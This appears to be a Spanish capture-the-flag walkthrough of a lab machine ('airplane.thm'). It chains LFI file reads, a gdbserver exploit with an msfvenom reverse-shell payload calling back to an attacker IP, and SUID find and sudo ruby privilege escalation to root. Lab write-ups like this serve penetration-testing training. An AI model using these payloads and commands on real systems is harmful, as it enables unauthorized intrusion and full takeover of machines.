Realizamos un escaneo con nmap y encontramos 3 servicios abiertos
![[Pasted image 20240613074419.png]]


Revisamos el puerto 8000 y encontramos que al intenetar acceder por ip nos muestra la url, asi que añadimos el dominio a la ip en nuestro archivo /etc/hosts
![[Pasted image 20240613074220.png]]

Una vez añadido si volvemos a la pagina vemos que ya tenemos acceso
![[Pasted image 20240613074300.png]]
![[Pasted image 20240613074321.png]]

Realizamos fuzzing web y no encontramos nada interesante
![[Pasted image 20240613085933.png]]

Al revisar la web encontramos que es vulnerable a LFI
![[Pasted image 20240613080635.png]]

Revisamos el fichero /etc/passwd y encontramos dos usuarios, carlos y hudson
![[Pasted image 20240613080807.png]]

Continuamos revisando y encontramos  que carlos pertenece al grupo sudo
![[Pasted image 20240613085637.png|250]]

Ahora revisaremos la carpeta de /proc que contiene la información sobre los procesos que se están ejecutando y los parámetros del kernel. El contenido del directorio proc es utilizado por una serie de herramientas para obtener información del sistema en tiempo de ejecución. Para automatizar este procesos tenemos es siguiente script:
[[Explotacion LFI con Script en python]]
![[Pasted image 20240613090153.png]]

Nos muestra muchisima información, vamos a filtrarla para que solo nos muestre las partes que contengan la palabra airplane
```Bash
cat process.txt | grep "airplane"
```
![[Pasted image 20240613090302.png]]

En la siguiente url tenemos información sobre el siguiente servicio
https://book.hacktricks.xyz/network-services-pentesting/pentesting-remote-gdbserver
gdbserver es una herramienta que permite depurar programas de forma remota. Se ejecuta junto al programa que necesita ser depurado en el mismo sistema, conocido como el "objetivo". Esta configuración permite al depurador de GNU conectarse desde una máquina diferente, el "host", donde se almacenan el código fuente y una copia binaria del programa depurado. La conexión entre gdbserver y el depurador puede hacerse sobre TCP o una línea serie, permitiendo configuraciones de depuración versátiles.

Ahora intentaremos obtener acceso desde este servicio, primero revisamos y encontramos un payload
![[Pasted image 20240613092509.png]]

Creamos el payload
```Bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.9.0.251 LPORT=4444 PrependFork=true -o pay.bin
```
![[Pasted image 20240613092819.png]]


Una vez creado el payload nos ponemos en escucha con netcat y ejecutamos el siguiente comando hasta obtener acceso, puede que necesitemos ejecutarlo varias veces
```Bash
python3 50539.py airplane.thm:6048 pay.bin
```
![[Pasted image 20240613093206.png]]

Y ya tenemos acceso a la maquina victima
![[Pasted image 20240613093258.png]]

Una vez dentro revisamos los permisos SUID
```Bash
find / -perm -4000 2>/dev/null
```
![[Pasted image 20240613105116.png]]

Revisandolos encontramos que ejecutando find obtendriamos acceso al usuario de Carlso
![[Pasted image 20240613105238.png]]

Revisamos el binario de find en la web de GTOFbins
![[Pasted image 20240613105333.png]]

Y al ejecutar el comando obtenemos una shell como Carlos
![[Pasted image 20240613105434.png]]

Estos son los permisos que hemos obtenido
![[Pasted image 20240613110119.png]]

Ahora buscaremos obtener una shell con el usuario de Carlos, para ello accederemos a la carpeta de ssh y añadiremos nuestra clave publica
![[Pasted image 20240613110051.png]]

Nos lo descargamos en la carpeta de .ssh de Carlos
![[Pasted image 20240613111657.png]]

Y ahora accedemos desde ssh
![[Pasted image 20240613111810.png]]
![[Pasted image 20240613111832.png]]

Revisamos los permisos que tenemos con sudo y vemos que podemos ejecutar ruby sin password
![[Pasted image 20240613112135.png]]

Para obtener la shell con privilegios de root tendremos que crear un archivo ruby el cual genere una shell y luego ejecutarlo desde root, para ello ejecutaremos los dos siguientes comandos y obtendremos los permisos de root
```
echo '"/bin/sh"' > /tmp/root.rb
sudo /usr/bin/ruby /root/../tmp/root.rb
```
![[Pasted image 20240613112802.png]]


------
# Pruebas post explotación

## Suid3num
Para ello primero nos descargamos la herramienta en nuestra maquina
```Bash
wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py --no-check-certificate && chmod 777 suid3num.py
```
![[Pasted image 20240613113209.png]]

Lo cargamos en la maquina victima
![[Pasted image 20240613113314.png]]

Y ahora lo ejecutamos, como podemos ver nos automatiza el encontrarnos los binarios e indicarnos que comando ejecutar
![[Pasted image 20240613113410.png]]
![[Pasted image 20240613113428.png]]

------
# Explotación GDB
Creamos el payload y le asignamos permisos de ejecución
```bash
sudo msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.9.0.251 LPORT=4444 PrependFork=true -f elf -o binary.elf
```
![[Pasted image 20240613120316.png]]

Este comando es lo mismo que gdb pero en mi caso estamos usando un sistema aarch64 entonces no es compatible con gdb pero el funcionamiento es el mismo simplemente añadimos que especficamos la arquitectura, una vez ejecutado todos estos comandos obtendriamos acceso a la maquina vicitma
```
gdb-multiarch binary.elf
set architecture i386:x86-64
target extended-remote 10.10.127.37:6048
remote put binary.elf /tmp/binary.elf
set remote exec-file /tmp/binary.elf
run
```
![[Pasted image 20240613130854.png]]
![[Pasted image 20240613131116.png]]

